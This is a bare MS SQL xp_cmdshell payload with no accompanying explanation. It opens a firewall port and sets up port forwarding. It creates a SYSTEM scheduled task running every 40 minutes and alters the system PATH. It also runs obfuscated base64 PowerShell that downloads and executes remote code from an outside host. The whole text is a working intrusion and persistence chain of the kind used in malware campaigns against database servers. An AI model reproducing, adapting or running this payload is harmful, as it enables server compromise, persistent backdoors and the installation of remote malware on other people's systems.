xp_cmdshell 'netsh.exe firewall add portopening tcp 65529 SDNS&
             netsh interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53&
             schtasks /create /ru system /sc MINUTE /mo 40 /tn Rtsa /tr "powershell -nop -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdAAuAHoAZQByADIALgBjAG8AbQAvAG0AcwAuAGoAcwBwACcAKQA=" /F & 
             echo %path%|findstr /i powershell>nul || (setx path "%path%;c:\windows\system32\WindowsPowershell\v1.0" /m) &
             schtasks /run /tn Rtsa & 
             whoami|findstr /i "network service"&&(powershell -nop -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdAAuAHoAZQByADIALgBjAG8AbQAvAHYALgBqAHMAcAA/AG0AcwBsAG8AdwAnACkA)'
